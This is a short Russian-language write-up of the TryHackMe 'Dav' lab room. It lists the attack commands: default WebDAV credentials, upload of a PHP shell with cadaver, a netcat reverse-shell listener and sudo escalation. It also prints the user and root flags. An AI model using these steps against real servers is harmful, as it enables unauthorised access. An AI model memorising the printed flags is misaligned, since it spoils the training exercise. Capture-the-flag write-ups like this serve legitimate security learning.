

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Dav](https://tryhackme.com/r/room/bsidesgtdav) 

Всего 1 заданиe:
## Задание 1
Прочитать user.txt и root.txt

### Ответьте на вопросы ниже
пользователь.txt
```commandline
nmap -sC -sV <IP>
wget --http-user="wampp" --http-password="xampp" http://<IP>/webdav/passwd.dav
cat passwd.dav 
# wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
curl -u "wampp:xampp" -X PUT http://<IP>/webdav/test
cadaver http://<IP>/webdav
# wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
put shell.php
quit
nc -nlvp 4444
SHELL=/bin/bash script -q /dev/null
cd /home/merlin/
cat user.txt
```
```commandline
449b40fe93f78a938523b7e4dcd66d2a
```
корень.txt
```commandline
sudo -l
sudo cat /root/root.txt
```
```commandline
101101ddc16b0cdf65ba0b8a7af7afa5
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)